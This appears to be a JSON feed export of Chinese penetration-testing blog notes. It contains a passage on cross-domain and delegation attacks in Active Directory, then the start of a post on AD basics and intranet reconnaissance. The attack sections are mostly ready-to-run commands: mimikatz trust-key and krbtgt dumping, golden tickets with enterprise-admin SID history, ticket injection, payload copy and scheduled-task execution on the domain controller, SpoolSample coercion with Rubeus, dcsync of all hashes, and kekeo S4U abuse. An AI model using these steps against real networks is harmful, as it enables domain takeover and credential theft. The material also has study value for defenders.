plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>\n<h2 id=\"跨域攻击\"><a class=\"markdownIt-Anchor\" href=\"#跨域攻击\">#</a> 跨域攻击</h2>\n<p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185010968.png\" alt=\"image-20221214185010968\"></p>\n<p><strong>跨域攻击方法</strong></p>\n<p>1、常规渗透方法（利用 web 漏洞）</p>\n<p>2、哈希传递票据攻击</p>\n<p>3、利用域信任关系</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185209529.png\" alt=\"image-20221214185209529\"></p>\n<p><strong>域信任关系</strong></p>\n<p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护，域信任作为域中的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同时，域信任利用 DNS 服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域，也就不存在通过域信任关系进行跨域资源共享了</p>\n<p><strong>域信任关系分类</strong></p>\n<p>域信任关系分为单向信任和双向信任</p>\n<p>单向信任：是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问流，受信任域内的用户（或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域内的资源。也就是说，A 域信任 B 域，那么 B 域内受信任的主体可以访问 A 域内信任 B 域的资源。</p>\n<p>双向信任：是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向可传递的。在创建子域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身份验证请求可以通关其父域向上流向信任域</p>\n<p>域信任关系也可以分为内部信任和外部信任</p>\n<p>内部信任：在默认情况下，用活动目录安装向导将新域添加到域树或林根域中，<strong>会自动创建双向可传递信任</strong>。在现有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为内部信任。这种信任关系是可传递的。例如，有三个子域 BA,CA,DA,BA 域信任 CA 域，CA 域信任 DA 域，则 BA 域也信任 DA 域。</p>\n<p>外部信任是指两个不同林中的域的信任关系。外部信任是不可传递的，而且是单向的。</p>\n<p>只有 domain admins 组中的用户可以管理域信任关系</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214185958266.png\" alt=\"image-20221214185958266\"></p>\n<p><strong>搭建和查看域信任关系</strong></p>\n<p><strong>搭建域树（内部信任）</strong></p>\n<p>如果是复制的虚拟机请运行 C:\\Windows\\System32\\sysprep\\sysprep.exe 重新获取 SID，选择通用，重启</p>\n<p>1、修改计算机名和修改 IP 地址，DNS 指向父域</p>\n<p>2、安装 AD 域服务</p>\n<p>3、升级为域控</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221216220001330.png\" alt=\"image-20221216220001330\"></p>\n<p>4、添加到现有林</p>\n<p>5、提供父域的账号密码</p>\n<p>6、正常安装直到结束</p>\n<p><strong>搭建域森林（外部信任）</strong></p>\n<p>1、修改计算机名和修改 IP 地址，DNS 指向根域</p>\n<p>2、安装 AD 域服务</p>\n<p>3、升级为域控</p>\n<p>4、添加到现有林</p>\n<p><strong>获取域信息</strong></p>\n<p>在域中，Enterprise Admins 组（出现在林中的根域中）的成员具有对目录林中所有域的完全控制权限。在默认情况下，该组包含林中所有域控制器上具有 Administrators 权限的成员</p>\n<p><strong>Enterprise admins 只在根域上有，并且能管理本域中所有的子域</strong></p>\n<p>查看当前域中计算机的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br></pre></td></tr></table></figure>\n<p>查看域信任关系</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nltest /domain_trusts</span><br></pre></td></tr></table></figure>\n<p><strong>使用 lg 工具获取域的相关信息</strong></p>\n<p>获取当前域中的用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe abc\\.</span><br></pre></td></tr></table></figure>\n<p>获取远程机器的本地用户组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe \\\\计算机名 -lu</span><br></pre></td></tr></table></figure>\n<p>获取远程系统中的用户 SID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LG.exe \\\\计算机名 -lu -sidsout</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用域信任密钥获取目标域\"><a class=\"markdownIt-Anchor\" href=\"#利用域信任密钥获取目标域\">#</a> <strong>利用域信任密钥获取目标域</strong></h3>\n<p>使用 mimikatz 获取 当前域的 SID 父域的 SID 子域域管的 NTLM 信任密钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:HACK$&quot; &quot;lsadump::trust /patch&quot; exit</span><br></pre></td></tr></table></figure>\n<p>rc4-hmac-hash  ==  NTLM hash</p>\n<p>在普通的域内用户中创建创建高权限票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;kerberos::golden /domain:子域 /sid:子域SID /sids:父域-519 /rc4:信任密</span><br><span class=\"line\">钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi&quot;</span><br><span class=\"line\">exit</span><br><span class=\"line\">mimikatz.exe &quot;kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-2902250016-</span><br><span class=\"line\">280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519</span><br><span class=\"line\">/rc4:4101a9a4410052f42a70990e5371a5b9 /user:administrator /service:krbtgt</span><br><span class=\"line\">/target:hack.com /ticket:administrator.kirbi&quot; exit</span><br></pre></td></tr></table></figure>\n<p>上传 asktgs.exe 和 kirbikator.exe 工具，asktgs.exe 伪造票据，kirbikator.exe 注入票据</p>\n<p>创建 CIFS 服务的票据进行复制文件的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell asktgs.exe administrator.kirbi CIFS/DC.hack.com</span><br></pre></td></tr></table></figure>\n<p>将票据注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell kirbikator.exe lsa CIFS.DC.hack.com.kirbi</span><br></pre></td></tr></table></figure>\n<p>访问域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>服务恶意文件，如果复制失败，请注入 host 服务票据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy 2.exe \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>伪造 host 服务，进行创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell asktgs.exe administrator.kirbi host/DC.hack.com</span><br></pre></td></tr></table></figure>\n<p>将票据注入内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell kirbikator.exe lsa host.DC.hack.com.kirbi</span><br></pre></td></tr></table></figure>\n<p>创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\\1.exe /ru system /f</span><br></pre></td></tr></table></figure>\n<p>执行计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用krbtgt哈希值获取目标域\"><a class=\"markdownIt-Anchor\" href=\"#利用krbtgt哈希值获取目标域\">#</a> <strong>利用 krbtgt 哈希值获取目标域</strong></h3>\n<p>获取 Krbtgt 散列</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure>\n<p>获取关键信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::trust /patch</span><br></pre></td></tr></table></figure>\n<p>构造并注入黄金票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Kerberos::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-</span><br><span class=\"line\">519 /krbtgt:krbtgt散列 /ptt Kerberos::golden /user:administrator /domain:abc.hack.com /sid:S-1-5-21-2902250016-280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519 /krbtgt:96d6714b1995e9d724a88ada46e9f30f /ptt</span><br></pre></td></tr></table></figure>\n<p>访问目标域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<h3 id=\"域内委派攻击概述\"><a class=\"markdownIt-Anchor\" href=\"#域内委派攻击概述\">#</a> <strong>域内委派攻击概述</strong></h3>\n<p>域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。委派是域中的一种安全设置，可以允许某个机器上的服务代表某个用户去执行某个操作，主要分为三种：</p>\n<p>1、非约束性委派</p>\n<p>2、约束性委派</p>\n<p>3、基于资源的约束性委派</p>\n<p>一个域内用户访问 WEB 服务，但是一些资源在文件服务上，这个时候就需要委派攻击</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219145249494.png\" alt=\"image-20221219145249494\"></p>\n<p>在域内只有主机账号和服务账号才有委派属性</p>\n<p>主机账号：活动目录中的 computers 组内的计算机，也被称为机器账号。</p>\n<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL 等；域用户通过注册 SPN 也能成为服务账号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net user test123 Admin@123 /add /domain 创建一个普通用户</span><br><span class=\"line\">setspn -U -A priv/test test123 注册为服务账号</span><br></pre></td></tr></table></figure>\n<h3 id=\"非约束委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#非约束委派攻击\">#</a> <strong>非约束委派攻击</strong></h3>\n<p><strong>利用非约束委派域控主动访问控制域</strong></p>\n<p>1、使用 Adfifind 查询域内非约束委派机器账号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>\n<p>查询具有委派的服务账号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)</span><br><span class=\"line\">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure>\n<p>3、这个时候如果域管访问了 pc-web 机器我们的内存中就会有域管的 TGT，就可以访问任意机器了，在</p>\n<p>与域控上执行访问 PC-WEB (在域控上执行)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\PC-WEB.HACK.COM /user:hack\\administrator Admin@123</span><br></pre></td></tr></table></figure>\n<p>4、去 pc-web 导出内存中的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>\n<p>4、进行票据传递就可以获取域控的权限了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt [0;54acdf]-2-0-60a10000-Administrator@krbtgt\u0002HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n<p>5、访问域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell dir \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>利用非约束委派域控被动访问控制域控</strong></p>\n<p>控制了域内的一台机器 OA，并且该机器的服务账号配置了非约束委派，如下：一般域管不会主动访问我们，我们可以 利用 Windows 打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRNRpcRemoteFindFirstPrinterChangeNotification (Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。非约束性委派主机结合 Spooler 打印机服务漏洞，让域控机器 DC 强制访问已控的具有本地管理员权限的非约束性委派机器 OA ，从而拿到域管理员的 TGT，进而接管域控。（2008 机器可能复现不了，因为版本的问题）</p>\n<p>进行实验之前一定要把所有的防火墙关闭</p>\n<p>1、首先利用 Rubeus 在 OA 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Rubeus.exe monitor /interval:1 /filteruser: DC$</span><br></pre></td></tr></table></figure>\n<p>再利用 SpoolSample 强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号去执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SpoolSample.exe DC OA</span><br></pre></td></tr></table></figure>\n<p>Rubeus 导入票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Rubeus.exe ptt /ticket:票据</span><br></pre></td></tr></table></figure>\n<p>获取域内用户的 hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::dcsync /all /csv</span><br></pre></td></tr></table></figure>\n<h3 id=\"约束性委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#约束性委派攻击\">#</a> <strong>约束性委派攻击</strong></h3>\n<p>当这个用户不在域内，他在出差，不能使用 kerberos 去认证，只能使用其他协议认证 web 系统，那同样 WEB 系统也需要访问文件服务的资源，这个时候如何认证呢</p>\n<p>Widnows Server 2003 之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软于 2007 年为 Kerberos 协议进行扩展引入 S4U (service for user) 协议，该协议分为两个子协议</p>\n<p>1、S4u2self（Service for User to Self）</p>\n<p>2、S4U2proxy（Service for User to Proxy）</p>\n<p>这两个扩展都允许服务代表用户从 KDC 请求票证</p>\n<p>约束委派限制了 S4U2proxy 协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219171904181.png\" alt=\"image-20221219171904181\"></p>\n<p>存在的问题</p>\n<p>1、服务账号 B 可以代表 A 申请访问 B 的票据，那么可不可以代表域管申请域管访问 B 的票据呢？在这个过程中，不需要域管参与，服务 B 自身就可以完成</p>\n<p>2、服务账号 B 可以代表 A 申请访问 C 的票据，那么可不可以代表域管申请域管访问 C 的票据呢？在这个过程中，不需要域管参与，服务 B 自身就可以完成</p>\n<p><strong>约束性委派攻击流程</strong></p>\n<p>用户（A）访问 WEB 系统（B）,B 代表 A 去向 KDC 申请访问 B 的 TGT 和 ST1 (使用 S4u2self), 用户 A 拿到了 ST1 就可以访问 B 了，如果在 B 上配置了约束性委派（A 到 C 的约束委派），则 B 能够使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 KDC,KDC 返回 B 一个访问 C 的票据 ST2，这样 B 就可以以用户的身份访问 C</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219172826955.png\" alt=\"image-20221219172826955\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.通过NTLM或者其他认证</span><br><span class=\"line\">2.B代表A申请A访问B的票据(TGT和ST1)</span><br><span class=\"line\">3.KDC返回用户的TGT和ST1票据给B</span><br><span class=\"line\">4.B把ST1票据给A</span><br><span class=\"line\">5.A用ST1去访问B</span><br><span class=\"line\">6.B拿着A的ST1作为证据，去申请访问C的ST2</span><br><span class=\"line\">7.B用ST2票据访问C</span><br></pre></td></tr></table></figure>\n<p>伪造 A 的 TGT，向 KDC 申请 ST1，有了 ST1，可以使用 ST1 申请配置了对应服务的 ST2</p>\n<p>我们已经控制了 ZS 的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的 HASH 值</p>\n<p>1、查询约束性委派的机器和用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询约束委派机器账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class=\"line\">查询约束委派服务账户</span><br><span class=\"line\">AdFind.exe -b &quot;DC=hack,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>\n<p>2、使用 mimikatz 获取机器账户 NTLM Hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n<p>3、使用 kekeo 申请配置了约束委派机器账户 PC-ZS$ 的 TGT</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kekeo &quot;tgt::ask /user:PC-ZS$ /NTLM:bd41aace231471169d848817a2c46178 /domain:hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>利用 TGT 通过伪造 S4U 请求以 administrator 身份访问 PC-ZS 的 ST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kekeo &quot;tgs::s4u /tgt:TGT_PC-ZS$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /user:Administrator@hack.com /service:cifs/dc.hack.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>mimkatz 注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::ptt TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/12/25/yuque/%E5%86%85%E7%BD%91/",
            "url": "http://example.com/2022/12/25/yuque/%E5%86%85%E7%BD%91/",
            "title": "内网渗透",
            "date_published": "2022-12-25T05:38:45.000Z",
            "content_html": "<h1 id=\"内网\"><a class=\"markdownIt-Anchor\" href=\"#内网\">#</a> 内网</h1>\n<p><strong>域基础知识，信息收集，密码抓取，内网横向，域控安全，跨域攻击</strong></p>\n<h2 id=\"域基础知识\"><a class=\"markdownIt-Anchor\" href=\"#域基础知识\">#</a> 域基础知识</h2>\n<h3 id=\"活动目录\"><a class=\"markdownIt-Anchor\" href=\"#活动目录\">#</a> 活动目录</h3>\n<p>活动目录 (Active Directory,AD) 是指域环境中提供目录服务的组件</p>\n<p>目录用于存储有关网络对象 (例如用户、组、计算机、共享资源、打印机和联系人等) 的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了 目录服务，为企业提供了网络环境的集中式管理机制</p>\n<p>活动目录的逻辑结构包括前面讲过的组织单元 (OU)、域、域树、域森林。域树内的所有域 共享一个活动目录，这个活动目录内的数据分散存储在各个域中，且每个域只存储该域内的数据。</p>\n<p>活动目录主要提供以下功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">账号集中管理:所有账号均存储在服务器中,以便执行命令和重置密码等。</span><br><span class=\"line\">软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件,可以让 用户自由选择需要安装的软件。</span><br><span class=\"line\">环境集中管理:统一客户端桌面、IE、TCPP协议等设置。 增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络,对资料进行统一管理。</span><br><span class=\"line\">更可靠,更短的宕机时间:例如,利用活动目录控制用户访问权限,利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠,宕机时间更短。</span><br><span class=\"line\">活动目录是微软提供的统一管理基础平台,ISA、 Exchange、SMS等都依赖这个平台</span><br></pre></td></tr></table></figure>\n<p>组织单元</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以在OU上部署组策略</span><br></pre></td></tr></table></figure>\n<p><strong>委派控制</strong></p>\n<p>因为财务部门有 20 个人，不能有问题就去找网络管理员，需要委派控制权限给财务部门一个代表，让他去执行，也就是说在财务部门找一个代表，他由相应的权限去管理财务部门的计算机和用户</p>\n<p>grant … 权限 …</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203143640363.png\" alt=\"image-20221203143640363\"></p>\n<p>如果需要委派的人较多，那么我们可以新建组，用户加组，对该组进行委派</p>\n<h3 id=\"域内权限\"><a class=\"markdownIt-Anchor\" href=\"#域内权限\">#</a> 域内权限</h3>\n<p>组</p>\n<p>组 (Group) 是用户账号的集合。通过向组分配权限，就可以不必向每个用户分别分配权限。例如，管理员在日常工作中，不必为单个用户账号设置独特的访问权限，只需要将用户账放到相应的安全组中。管理员通过配置安全组访问权限，就可以为所有加入安全组的用户账号配置同样的权限。使用安全组而不是单个的用户账号，可以大大简化网络的维护和管理工作</p>\n<p><strong>域本地组</strong></p>\n<p>域本地组成员来自林中任何域中的用户账户、全局组和通用组以及本域中的域本地组，在本域范围内可用。</p>\n<p><strong>全局组</strong></p>\n<p>全局组成员来自于同一域的用户账户和全局组，在林范围内可用</p>\n<p><strong>通用组</strong></p>\n<p>通用组成员来自林中任何域中的用户账户、全局组和其他的通用组，在全林范围内可用</p>\n<p>域本地组来自全林，作用于本域；</p>\n<p>全局组来自本域，作用于全林；</p>\n<p>通用组来自林，作用于全林。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203150027803.png\" alt=\"image-20221203150027803\" style=\"zoom: 33%;\" />\n<p><strong>A-G-DL-P 策略</strong></p>\n<p>A-G-DL-P 策略是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p>\n<p>A 表示用户账号 (Account)</p>\n<p>G 表示全局组 (Global Group)</p>\n<p>U 表示通用组 (Universal Group)</p>\n<p>DL 表示域本地组 (Domain Local Group)</p>\n<p>P 表示资源权限 (Permission, 许可)</p>\n<p>按照 AG-DL-P 策略对用户进行组织和管理是非常容易的。在 AGDL-P 策略形成以后，当需要给一个用户添加某个权限时，只要把这个用户添加到某个本地域组中就可以了。</p>\n<p>A -&gt; G -&gt;DL -&gt; P</p>\n<h3 id=\"安全域划分\"><a class=\"markdownIt-Anchor\" href=\"#安全域划分\">#</a> 安全域划分</h3>\n<p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。这个网段内的计算机拥 有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 ，从而对允许哪些 IP 地址访问此域、允许此域访问哪些 IP 地址和网段进行设置。这些 措施，将使得网络风险最小化，当攻击发生时，可以尽可能地将威胁隔离，从而降低对域内计算机的影响。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203152306469.png\" alt=\"image-20221203152306469\"></p>\n<p>在一个用路由器连接的内网中，可以将网络划分为三个区域:</p>\n<p>安全级别最高的内网；</p>\n<p>安全级别中等的 DMZ;</p>\n<p>安全级别最低的外网</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内网可以访问外网:内网用户需要自由地访问外网。在这一策略中,防火墙需要执行NAT。</span><br><span class=\"line\">内网可以访问DMZ:此策略使内网用户可以使用或者管理DMZ中的服务器</span><br><span class=\"line\">外网不能访问内网:这是防火墙的基本策略。内网中存储的是公司内部数据,显然,这些数据一般是不允许外网用户访问的(如果要访问,就要通过VPN的方式来进行)</span><br><span class=\"line\">外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务,所以外网必须可以访问DMZ。同时,需要由防火墙来完成从对外地址到服务器实际地址的转换。</span><br><span class=\"line\">DMZ不能访问内网:如果不执行此策略,当攻击者攻陷DMZ时,内网将无法受到保护</span><br><span class=\"line\">DMZ不能访问外网:此策略也有例外。例如,在DMZ中放置了邮件服务器,就要允许访问外网,否则邮件服务器无法正常工作。</span><br></pre></td></tr></table></figure>\n<h2 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>攻击流程详解</p>\n<p>信息收集 - 漏洞利用 - 权限提升 - 权限维持 - 隧道技术 - 内网渗透</p>\n<p>下面建立在你有 shell，你把人家上了的情况</p>\n<h3 id=\"收集本机信息\"><a class=\"markdownIt-Anchor\" href=\"#收集本机信息\">#</a> 收集本机信息</h3>\n<h4 id=\"查看基本信息\"><a class=\"markdownIt-Anchor\" href=\"#查看基本信息\">#</a> 查看基本信息</h4>\n<p>1. 收集网络信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell ipconfig</span><br></pre></td></tr></table></figure>\n<p>2. 收集操作系统和软件信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell 